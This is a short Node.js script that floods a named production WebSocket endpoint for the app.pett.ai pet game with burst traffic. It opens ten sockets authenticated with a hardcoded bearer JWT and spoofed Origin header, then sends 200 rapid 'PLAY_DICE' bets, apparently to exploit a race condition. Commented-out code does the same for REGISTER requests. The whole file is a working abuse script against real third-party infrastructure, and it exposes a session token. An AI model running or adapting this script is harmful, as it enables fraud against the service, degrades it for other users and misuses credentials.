import WebSocket from "ws";
import { v4 as uuidv4 } from "uuid";

const endpoint = "wss://petbot-monorepo-websocket-333713154917.europe-west1.run.app/";
const jwt = "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlU3bU9NMzBNZGJRY3RQMmdoWE4wU0dhTDFIWjNSUWVoZWxkZUNHNF9OaWsifQ.eyJzaWQiOiJjbWY4OWpieG0wMDJ2a3kwYnF2aHltZnh0IiwiaXNzIjoicHJpdnkuaW8iLCJpYXQiOjE3NTcxNzAxNjUsImF1ZCI6ImNtN2dldjVzNjAwdmJrMmxzajZlMWU5ZzciLCJzdWIiOiJkaWQ6cHJpdnk6Y21mODlqYnoxMDAyeGt5MGIzZ3NhOHhhYyIsImV4cCI6MTc1NzE3Mzc2NX0.7dPG8eflGl6FjBJeMc8zktXe0f2x7B2DpItaH8xTvziUB72FG3BLuFhjCcSLEtexuKjulHaym-HM3qAxtD3PMA";
const origin = "https://app.pett.ai";

// const pettName = `ao_${Math.round(Math.random() * 999)}_ran_${Math.round(Math.random() * 999)}`;
// console.log('Pett Name = ' + pettName)

const connections = 10;
const messagesPerSocket = 20;

let sockets = [];
let readyCount = 0;
let sentCount = 0;
let successCount = 0;

function buildAuthMessage() {
  return {
    type: "AUTH",
    data: { params: { authType: "privy", authHash: { hash: jwt } } },
    nonce: uuidv4(),
  };
}

function buildSpamMessage() {
//   return {
//     type: "REGISTER",
//     data: {
//       params: { authType: "privy", registerHash: { hash: jwt, name: pettName } },
//     },
//     nonce: uuidv4(),
//   };
  return {
    type: "PLAY_DICE",
    data: {
        params: {
            betAmount: 500,
            selectedBet: {
                type: "odd"
            }
        }
    },
    nonce: uuidv4()
  };
}

function sendOneBurst() {
  const total = connections * messagesPerSocket;
  console.log(`🚀 Attempting burst of ${total} messages`);

  const payloads = sockets.flatMap(sock =>
    Array.from({ length: messagesPerSocket }, () => sock)
  );

  let i = 0;
  let wave = setInterval(() => {
    for (let j = 0; j < 5 && i < payloads.length; j++, i++) {
      const sock = payloads[i];
      if (sock.readyState === WebSocket.OPEN) {
        sock.send(JSON.stringify(buildSpamMessage()));
        sentCount++;
      }
    }

    if (i >= payloads.length) {
      clearInterval(wave);
      console.log(`✅ All messages attempted: ${sentCount}`);
      console.log(`🔹 Successful REGISTER responses so far: ${successCount}`);
    }
  }, 1);
}

function connectSocket(index) {
  return new Promise((resolve) => {
    const ws = new WebSocket(endpoint, { headers: { Origin: origin } });

    ws.on("open", () => ws.send(JSON.stringify(buildAuthMessage())));

    ws.on("message", (data) => {
      try {
        const msg = JSON.parse(data.toString());
        if (msg.type === "register" || msg.type === 'REGISTER') {
            console.log(msg);
        }
        if (msg.type === "auth_result") {
            console.log(`Tokens = ${Math.round(Number(msg?.pet?.PetTokens?.tokens) / Number(1000000000000000000))}, Error = ${msg?.error}`);
            sockets.push(ws);
            readyCount++;
            resolve();
        } else {
            console.log(msg);
        }

        // Track successful REGISTER responses
        if (msg.type === "REGISTER" && !msg.error) {
          successCount++;
          if (successCount % 10 === 0) {
            console.log(`🔹 Success count: ${successCount}`);
          }
        }
      } catch (e) {}
    });

    ws.on("error", (err) => {
      console.error(`❌ Socket ${index + 1} error:`, err.message);
    });
  });
}

async function main() {
  console.log(`🔌 Opening ${connections} sockets...`);
  await Promise.all(Array.from({ length: connections }, (_, i) => connectSocket(i)));

  console.log(`🎉 All ${readyCount} sockets authenticated`);
  sendOneBurst();
}

main();
